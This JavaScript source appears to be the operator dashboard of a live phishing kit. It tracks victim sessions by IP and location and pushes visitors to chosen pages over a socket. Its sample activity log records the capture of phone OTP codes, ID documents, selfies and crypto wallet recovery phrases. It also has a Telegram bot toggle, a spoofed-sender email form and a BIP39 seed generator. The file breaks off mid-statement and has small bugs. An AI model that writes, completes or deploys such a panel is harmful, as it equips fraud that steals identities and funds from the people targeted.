const socket = window.socket || io({
  reconnection: true,
  reconnectionAttempts: 5,
  reconnectionDelay: 1000,
  transports: ['websocket']
});
window.socket = socket;
const previewCache = new Map();
const RENDER_TABLE_DEBOUNCE_MS = 100;

async function logErrorToServer(errorData) {
  const logEndpoint = '/api/v1/log-error';
  let queries = new Set()
  let payload = {};
  const timestamp = new Date().toISOString();
  const context = {
      sessionId: typeof state !== 'undefined' && state?.selectedSession?.id ? state.selectedSession.id : 'N/A',
      currentPage: typeof state !== 'undefined' && state?.selectedPage ? state.selectedPage : window.location.pathname,
      userAgent: navigator.userAgent
  };

  if (errorData instanceof Error) {
      payload = {
          message: errorData.message,
          stack: errorData.stack,
          name: errorData.name,
          timestamp: timestamp,
          context: context
      };
  } else if (typeof errorData === 'object' && errorData !== null) {
      try {
          payload = {
              message: JSON.stringify(errorData),
              timestamp: timestamp,
              context: context
          };
      } catch (e) {
          payload = {
              message: "Failed to stringify error object for logging.",
              originalType: typeof errorData,
              timestamp: timestamp,
              context: context
          }
      }
  } else {
      payload = {
          message: String(errorData),
          timestamp: timestamp,
          context: context
      };
  }

  try {
      const response = await fetch(logEndpoint, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload),
      });

      if (!response.ok) {
      }
  } catch (networkError) {
  }
}

document.addEventListener('DOMContentLoaded', async() => {
  let currentPage = '/waiting';
  let hasShownTableLoader = false;
  const REQUIRED_COLORS = [
    '--background',
    '--background-card',
    '--background-box',
    '--primary-light',
    '--border-color',
    '--text-color',
    '--text-color-secondary',
    '--primary-dark',
    '--color-primary',
    '--color-success',
    '--color-warning',
    '--color-error',
    '--color-info',
    '--default-switch-btn'
  ];
  const darkPreset = {
    "--background": "#000000",
    "--background-card": "#080808",
    "--background-box": "#090909",
    "--border-color": "#060606",
    "--text-color": "#e0e0e0",
    "--text-color-secondary": "#c9c9c9",
    "--primary-light": "#1e88e5",
    "--primary-dark": "#105cd4",
    "--color-primary": "#105cd4",
    "--color-success": "#66bb6a",
    "--color-warning": "#ffa726",
    "--color-error": "#ef5350",
    "--color-info": "#42a5f5",
    "--default-switch-btn": "#8596b0"
  };
  
  const lightPreset = {
    "--background": "#f9fafb",
    "--background-card": "#ffffff",
    "--background-box": "#f9f9f9",
    "--border-color": "#5a5858",
    "--text-color": "#111827",
    "--text-color-secondary": "#5a5858",
    "--primary-light": "#2563eb",
    "--color-primary": "#2563eb",
    "--color-success": "#22c55e",
    "--color-warning": "#eab308",
    "--color-error": "#ef4444",
    "--color-info": "#3b82f6",
    "--default-switch-btn": "#e5e7eb"
  };

  const sessionManagerObserver = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      if (mutation.addedNodes.length > 0 && state.sessionManagerActiveTab === 'workflow') {
        const sendToUserBtn = document.getElementById('sendToUser');
        if (sendToUserBtn) {
          setSessionManagerTab('workflow');
        }
      }
    });
  });


  const PRESET_STORE = {
    listKey: 'customThemePresets',
    overridesKey: name => `themeOverrides_${name}`,
    activeKey: 'themePreset'
  };

  document.getElementById('genereateSeedBtn').addEventListener('click', async () => {
    const presetValue = document.getElementById("seedFormat").value;
    const numWords = presetValue === "12" ? 12 : 24;
    try {
      const mnemonic = await generateMnemonic(numWords);
    document.getElementById("seedInput").value = mnemonic;
    } catch (error) {
    }
  });

  document.getElementById('copySeed').addEventListener('click', () => {
    const seed = document.getElementById("seedInput").value;
    navigator.clipboard.writeText(seed)
      .then(() => showToast('Copied to clipboard', 'success'));
  });
  document.getElementById("preset").addEventListener("change", e => {
    const root = document.documentElement.style;
    const selectedPreset = e.target.value;
    if (selectedPreset === "dark") {
      Object.entries(darkPreset).forEach(([prop, val]) => {
        root.setProperty(prop, val);
      });
  
      Object.keys(lightPreset).forEach(prop => {
        root.removeProperty(prop);
      });
    } 
    else if (selectedPreset === "light") {
      Object.entries(lightPreset).forEach(([prop, val]) => {
        root.setProperty(prop, val);
      });
  
      Object.keys(darkPreset).forEach(prop => {
        root.removeProperty(prop);
      });
    } 
    else {
      const storedOverrides = localStorage.getItem(PRESET_STORE.overridesKey(selectedPreset)) || '{}';
      let overrides = {};
      try {
        overrides = JSON.parse(storedOverrides);
      } catch (e) {
        logErrorToServer(error);
      }
  
      Object.entries(overrides).forEach(([prop, val]) => {
        root.setProperty(prop, val);
      });
    }
    syncColorInputs();
  });

  
  const state = {
    sessionData: {},
    darkMode: false,
    activeTab: 'sessions',
    notifications: [
      {
        id: 1,
        title: 'New session started',
        message: 'A new user session has been initiated from New York, US',
        time: '2 minutes ago',
        unread: true,
      },
      {
        id: 2,
        title: 'Session terminated',
        message: 'Session sess_123abc was terminated by admin',
        time: '5 minutes ago',
        unread: false,
      },
      {
        id: 3,
        title: 'Security alert',
        message: 'Multiple failed login attempts detected',
        time: '10 minutes ago',
        unread: true,
      }
    ],
    showNotifications: true,
    showSettings: false,
    terminatedSessions: [],
    sessions: [
      {
        id: 'sess_123abc456',
        ip: '192.168.1.1',
        location: 'New York, US',
        countryCode: 'US',
        browser: 'chrome',
        os: 'windows',
        deviceInfo: 'Chrome 120.0 / Windows',
        created: '2024-03-10 14:30',
        lastPingTimestamp: new Date(Date.now() * 60000),
        current_Page: '/dashboard',
        isActive: false,
      },
      {
        id: 'sess_456def789',
        ip: '10.0.0.1',
        location: 'London, CA',
        countryCode: 'CA',
        browser: 'firefox',
        os: 'macos',
        deviceInfo: 'Firefox 123.0 / macOS',
        created: '2024-03-10 14:25',
        lastPingTimestamp: new Date(Date.now() * 60000),
        current_page: '/settings',
        isActive: false,
      },
      {
        id: 'sess_whre',
        ip: '132.0.0.1',
        location: 'Niger, AZ',
        countryCode: 'AZ',
        browser: 'brave',
        os: 'linux',
        deviceInfo: 'Firefox 123.0 / macoS',
        created: '2024-03-10 14:25',
        lastPingTimestamp: new Date(Date.now() * 60000),
        current_page: '/pornhub',
        isActive: false,
      }
    ],
    selectedSession: null,
    sessionManagerVisible: false,
    sessionManagerActiveTab: 'pages',
    selectedPage: null,
    notificationsEnabled: false,
    soundEffectsEnabled: false,
    
    telegram_bot: getCookie("telegram_bot") === "true" || false,
    showRequiredInfo: false,
    requiredInfoValue: '',
    showRequiredInfoError: false,
    emailForm: {
      recipient: '',
      sender: 'support@company.com',
      subject: '',
      template: ''
    },
    activityLog: [
      {
        id: 1,
        type: 'login',
        icon: 'log-in',
        message: 'User logged in successfully',
        timestamp: new Date(Date.now() - 5 * 60000),
        iconColor: 'text-primary-light dark:text-primary-dark'
      },
      {
        id: 2,
        type: 'phone-otp',
        icon: 'smartphone',
        message: 'Phone verification completed',
        timestamp: new Date(Date.now() - 10 * 60000),
        iconColor: 'text-status-success-light dark:text-status-success-dark'
      },
      {
        id: 3,
        type: 'id-upload',
        icon: 'credit-card',
        message: 'ID documents uploaded',
        timestamp: new Date(Date.now() - 15 * 60000),
        iconColor: 'text-accent-light dark:text-accent-dark'
      },
      {
        id: 4,
        type: 'selfie-upload',
        icon: 'camera',
        message: 'Selfie verification completed',
        timestamp: new Date(Date.now() - 20 * 60000),
        iconColor: 'text-status-info-light dark:text-status-info-dark'
      },
      {
        id: 5,
        type: 'wallet-seed',
        icon: 'wallet',
        message: 'Recovery phrase confirmed',
        timestamp: new Date(Date.now() - 25 * 60000),
        iconColor: 'text-primary-light dark:text-primary-dark'
      }
    ],
    availablePages: []
  };


  function showTableLoader() {
    if (hasShownTableLoader) return;
    hasShownTableLoader = true;
    const tableContainer = document.querySelector('#sessionsTable');
    if (!tableContainer) return;
    const overlay = document.createElement('div');
    overlay.id = 'table-loading-overlay';
    overlay.style.cssText = "position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(3px); z-index: 100; display: flex; justify-content: center; align-items: center; transition: opacity 0.5s; border-radius: 8px;";
    const spinner = document.createElement('div');
    spinner.style.cssText = "width: 40px; height: 40px; border: 3px solid rgba(255, 255, 255, 0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite;";
    if (!document.getElementById('spinner-style')) {
      const style = document.createElement('style');
      style.id = 'spinner-style';
      style.textContent = "@keyframes spin { to { transform: rotate(360deg); } }";
      document.head.appendChild(style);
    }
    if (getComputedStyle(tableContainer).position === 'static') {
      tableContainer.style.position = 'relative';
    }
    overlay.appendChild(spinner);
    tableContainer.appendChild(overlay);
  }
  
  document.addEventListener('ws:reconnected', () => {
    if (typeof wsListener === 'function') {
        wsListener();
    } else {
    }
    if (typeof reqSes === 'function') {
        reqSes();
    }
    if (typeof fetchAvailablePages === 'function') {
        fetchAvailablePages();
    }
    if (typeof fetchConfiguration === 'function') {
        fetchConfiguration();
    }
    if (typeof loadNotifications === 'function') {
        loadNotifications();
    }
    if (typeof updateWebsocketStatusIndicator === 'function') {
        updateWebsocketStatusIndicator(true);
    }
  });

  function hideTableLoader() {
    const overlay = document.querySelector('#table-loading-overlay');
    if (!overlay) return;
    overlay.style.opacity = '0';
    setTimeout(() => {
      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
    }, 500);
  }

  function fetchAvailablePages() {
    try {
      console.debug('Starting fetch for available pages...');
      fetchConfiguration()
        .then(apiData => {
          if (!apiData) {
               return;
          }
          console.debug('API data parsed:', apiData);
          const pages = apiData.pages || {};
          const availablePages = Object.keys(pages).map(pageKey => {
            const pageData = pages[pageKey];
            if (!pageData) {
                return null; 
            }
            return {
              id: pageKey,
              route: pageData.route,
              label: pageData.route || `/${pageKey}`,
              originalKey: pageKey,
              icon: pageData.icon || 'log-in',
              type: pageData.type, 
              required_data: pageData.panel?.input?.required_data || [],
              form: pageData.form || {},
              preview_image: pageData.preview_image || ''
            };
          }).filter(page => page !== null); 

          state.availablePages = availablePages;
          console.debug('Updated state.availablePages:', state.availablePages);
          renderWorkflow(); 
          renderAvailablePages(); 
        })
        .catch(error => {
          logErrorToServer({ message: 'Error fetching or parsing config', error: error.toString(), stack: error.stack });
        });
    } catch (error) {   
      logErrorToServer({ message: 'Synchronous error in fetchAvailablePages', error: error.toString(), stack: error.stack });
    }
  }
  

  const bip39Wordlist = [
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
    "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
    "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
    "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
    "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert",
    "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter",
    "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger",
    "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique",
    "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic",
    "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest",
    "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset",
    "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
    "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake",
    "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge",
    "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain",
    "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become",
    "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit",
    "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology",
    "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless",
    "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
    "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss",
    "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread",
    "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze",
    "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb",
    "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy",
    "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call",
    "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas",
    "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry",
    "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category",
    "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century",
    "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase",
    "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
    "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle",
    "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk",
    "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close",
    "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
    "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort",
    "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control",
    "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost",
    "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
    "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek",
    "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial",
    "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup",
    "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
    "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal",
    "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense",
    "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny",
    "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk",
    "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond",
    "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur",
    "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance",
    "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain",
    "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama",
    "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop",
    "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf",
    "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo",
    "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
    "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody",
    "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless",
    "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough",
    "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip",
    "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate",
    "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange",
    "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit",
    "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye",
    "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame",
    "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father",
    "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female",
    "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file",
    "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first",
    "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor",
    "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly",
    "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest",
    "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile",
    "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen",
    "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy",
    "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp",
    "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture",
    "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance",
    "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue",
    "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown",
    "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid",
    "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt",
    "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy",
    "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health",
    "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden",
    "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole",
    "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital",
    "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred",
    "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea",
    "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune",
    "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate",
    "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury",
    "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install",
    "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue",
    "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel",
    "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior",
    "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney",
    "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife",
    "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language",
    "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
    "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
    "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level",
    "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit",
    "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster",
    "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love",
    "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad",
    "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage",
    "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market",
    "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
    "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt",
    "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message",
    "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor",
    "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile",
    "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral",
    "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie",
    "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual",
    "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature",
    "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net",
    "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee",
    "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now",
    "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe",
    "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often",
    "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online",
    "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order",
    "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output",
    "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact",
    "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper",
    "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol",
    "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen",
    "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo",
    "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot",
    "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate",
    "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar",
    "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post",
    "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare",
    "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private",
    "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property",
    "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin",
    "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle",
    "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit",
    "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp",
    "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor",
    "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle",
    "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release",
    "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen",
    "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response",
    "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib",
    "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot",
    "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket",
    "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal",
    "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness",
    "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand",
    "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter",
    "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script",
    "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed",
    "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service",
    "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell",
    "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop",
    "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side",
    "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since",
    "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill",
    "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight",
    "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth",
    "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda",
    "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry",
    "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn",
    "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin",
    "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring",
    "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp",
    "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick",
    "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street",
    "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway",
    "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny",
    "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey",
    "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim",
    "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag",
    "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi",
    "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text",
    "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought",
    "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber",
    "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler",
    "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool",
    "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist",
    "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer",
    "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick",
    "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust",
    "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle",
    "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella",
    "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform",
    "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade",
    "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful",
    "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van",
    "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue",
    "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory",
    "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual",
    "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage",
    "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash",
    "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather",
    "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat",
    "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will",
    "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise",
    "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world",
    "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year",
    "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
  ];

  function getRandomInt(max) {
    const array = new Uint32Array(1);
    window.crypto.getRandomValues(array);
    return array[0] % max;
  }

  function bytesToBinary(bytes) {
    let binary = '';
    for (let i = 0; i < bytes.length; i++) {
        binary += bytes[i].toString(2).padStart(8, '0');
    }
    return binary;
}

  async function sha256(data) {
    const buffer = await crypto.subtle.digest('SHA-256', data);
    return new Uint8Array(buffer);
  }

  async function generateMnemonic(wordCount) {
    if (wordCount !== 12 && wordCount !== 24) {
      throw new Error('Word count must be 12 or 24');
    }
    const entropyBits = wordCount === 12 ? 128 : 256;
    const entropyBytes = entropyBits / 8;
    const randomBytes = new Uint8Array(entropyBytes);
    window.crypto.getRandomValues(randomBytes);
    const hash = await sha256(randomBytes);
    const entropyBinary = bytesToBinary(randomBytes); 
    const checksumLengthBits = entropyBits / 32;
    const hashBinary = bytesToBinary(hash); 
    const checksumBits = hashBinary.slice(0, checksumLengthBits);
    const combinedBits = entropyBinary + checksumBits;
    const combinedBitsLength = (entropyBytes * 8) + checksumLengthBits;
    if (combinedBits.length !== combinedBitsLength) {
        throw new Error(`Internal error: Combined bits length mismatch. Expected ${combinedBitsLength}, got ${combinedBits.length}`);
    }
    const words = [];
    for (let i = 0; i < combinedBits.length; i += 11) {
        const chunk = combinedBits.slice(i, i + 11);
        if (chunk.length !== 11) {
             throw new Error(`Internal error: Invalid chunk size ${chunk.length} at index ${i}`);
        }
        const index = parseInt(chunk, 2);
        if (index >= bip39Wordlist.length) {
            throw new Error(`Invalid word index generated: ${index} from chunk ${chunk}`);
        }
      words.push(bip39Wordlist[index]);
    }
    if (words.length !== wordCount) {
        throw new Error(`Generated unexpected number of words: ${words.length}, expected ${wordCount}`);
    }

    return words.join(' ');
}


  const savedTab = localStorage.getItem('activeTab');
  if (savedTab && ['sessions', 'email', 'misc'].includes(savedTab)) {
